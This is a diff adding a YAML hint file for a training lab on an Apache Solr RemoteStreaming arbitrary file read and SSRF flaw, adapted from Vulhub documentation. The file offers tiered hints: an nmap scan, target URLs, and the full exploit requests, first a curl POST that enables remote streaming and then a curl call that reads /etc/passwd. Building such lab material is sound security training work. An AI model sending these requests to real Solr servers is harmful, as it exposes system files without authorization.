@@ -1,0 +1,93 @@
+# Optional ScenarioForge guide hints; derived from the adjacent public Vulhub documentation.
+schema_version: 1
+match: solr/Remote-Streaming-Fileread
+hint_levels:
+  low:
+  - Inspect the solr service or application on {{NODE_NAME}} @ {{NODE_IP}}.
+  medium:
+  - |-
+    Catalog TCP ports: 5005,8983. Identify the exposed services:
+
+    ```bash
+    nmap -Pn -sT -sV -p 5005,8983 {{NODE_IP}}
+    ```
+  - 'Catalog port mappings (published → container): solr: 8983/tcp → container 8983/tcp; solr: 5005/tcp → container
+    5005/tcp. These are recipe defaults; use the deployed service port if the scenario remaps it.'
+  - 'Documented target URL(s): `http://{{NODE_IP}}:8983/`, `http://{{NODE_IP}}:8983/solr/admin/cores`, `http://{{NODE_IP}}:8983/solr/demo/config`,
+    `http://{{NODE_IP}}:8983/solr/demo/debug/dump`.'
+  high:
+  - 'Vulnerability: Apache Solr RemoteStreaming Arbitrary File Reading and SSRF.'
+  - |-
+    Vulnerability Reproduction
+
+    First, visit `http://{{NODE_IP}}:8983/solr/admin/cores?indexInfo=false&wt=json` to extract the database name:
+
+    Documentation illustration: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/solr/Remote-Streaming-Fileread/1.png
+
+    Send the following request to modify the configuration of the `demo` core and enable `RemoteStreaming`:
+
+    ```
+    curl -i -s -k -X $'POST' \
+         -H $'Content-Type: application/json' --data-binary $'{\"set-property\":{\"requestDispatcher.requestParsers.enableRemoteStreaming\":true}}' \
+         $'http://{{NODE_IP}}:8983/solr/demo/config'
+    ```
+
+    Documentation illustration: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/solr/Remote-Streaming-Fileread/2.png
+
+    Then, you can read arbitrary files through the `stream.url` parameter:
+
+    ```
+    curl -i -s -k 'http://{{NODE_IP}}:8983/solr/demo/debug/dump?param=ContentStreams&stream.url=file:///etc/passwd'
+    ```
+
+    Documentation illustration: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/solr/Remote-Streaming-Fileread/3.png
+  - 'Publicly available documentation: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/solr/Remote-Streaming-Fileread/README.md'
+  - |-
+    Additional public references:
+    - https://mp.weixin.qq.com/s/3WuWUGO61gM0dBpwqTfenQ
+access_instructions:
+  title: Apache Solr RemoteStreaming Arbitrary File Reading and SSRF
+  steps:
+  - title: Locate the target service
+    instructions: |-
+      Catalog TCP ports: 5005,8983. Identify the exposed services:
+
+      ```bash
+      nmap -Pn -sT -sV -p 5005,8983 {{NODE_IP}}
+      ```
+
+      Catalog port mappings (published → container): solr: 8983/tcp → container 8983/tcp; solr: 5005/tcp → container 5005/tcp. These are recipe defaults; use the deployed service port if the scenario remaps it.
+
+      Documented target URL(s): `http://{{NODE_IP}}:8983/`, `http://{{NODE_IP}}:8983/solr/admin/cores`, `http://{{NODE_IP}}:8983/solr/demo/config`, `http://{{NODE_IP}}:8983/solr/demo/debug/dump`.
+  - title: Vulnerability Reproduction
+    instructions: |-
+      First, visit `http://{{NODE_IP}}:8983/solr/admin/cores?indexInfo=false&wt=json` to extract the database name:
+
+      Documentation illustration: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/solr/Remote-Streaming-Fileread/1.png
+
+      Send the following request to modify the configuration of the `demo` core and enable `RemoteStreaming`:
+
+      ```
+      curl -i -s -k -X $'POST' \
+           -H $'Content-Type: application/json' --data-binary $'{\"set-property\":{\"requestDispatcher.requestParsers.enableRemoteStreaming\":true}}' \
+           $'http://{{NODE_IP}}:8983/solr/demo/config'
+      ```
+
+      Documentation illustration: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/solr/Remote-Streaming-Fileread/2.png
+
+      Then, you can read arbitrary files through the `stream.url` parameter:
+
+      ```
+      curl -i -s -k 'http://{{NODE_IP}}:8983/solr/demo/debug/dump?param=ContentStreams&stream.url=file:///etc/passwd'
+      ```
+
+      Documentation illustration: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/solr/Remote-Streaming-Fileread/3.png
+guidance_source:
+  repository: https://github.com/vulhub/vulhub
+  snapshot_commit: 3af973a39bd0988f288a53fa9ea4b82372774e58
+  documentation_url: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/solr/Remote-Streaming-Fileread/README.md
+  readme_sha256: 92cdb257cd3251ce264b65727ca1d51b05a8153bb050f6e58f14e8af2e293093
+  compose_sha256: 8080e6320fec390a6eb8a865a40df741957f119b125b8cbeed1a2891dae0336c
+  license: MIT; see vulnhub/content/LICENSE
+  method: Tiered discovery hints and adapted reproduction text from the local catalog snapshot. Reproduction commands
+    have not been executed.
